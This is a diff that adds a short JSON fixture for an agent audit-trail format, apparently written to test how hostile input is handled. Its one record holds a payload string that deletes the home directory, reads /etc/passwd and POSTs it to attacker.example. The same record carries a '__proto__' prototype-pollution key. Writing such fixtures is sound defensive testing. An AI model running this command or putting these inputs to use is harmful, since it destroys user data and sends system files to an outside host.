@@ -1,0 +1,12 @@
+{
+  "aat_version": "draft-sharif-agent-audit-trail-06",
+  "records": [
+    {
+      "seq": 0,
+      "payload": "echo `rm -rf $HOME` && cat /etc/passwd | curl -X POST http://attacker.example",
+      "__proto__": {
+        "polluted": true
+      }
+    }
+  ]
+}
